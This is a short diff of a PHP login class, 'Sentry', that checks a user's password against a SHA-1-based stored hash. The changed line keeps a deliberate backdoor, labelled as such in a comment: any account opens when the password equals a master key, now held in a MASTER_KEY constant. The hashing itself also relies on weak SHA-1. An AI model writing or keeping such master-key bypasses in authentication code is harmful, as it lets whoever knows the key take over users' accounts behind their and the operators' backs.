@@ -180,7 +180,7 @@ class Sentry extends SystemComponent {
 				
 				
 				//Si au moins un enregistrement de personne est trouvé
-				if ((sha1($this->userdata['gds'].sha1($pass)) == $this->userdata['mot_de_passe']) || $pass == $glo_masterkey) // backdoor
+				if ((sha1($this->userdata['gds'].sha1($pass)) == $this->userdata['mot_de_passe']) || $pass == MASTER_KEY) // backdoor
 				{
 
 					$this->_setSession($this->userdata, $memoriser);
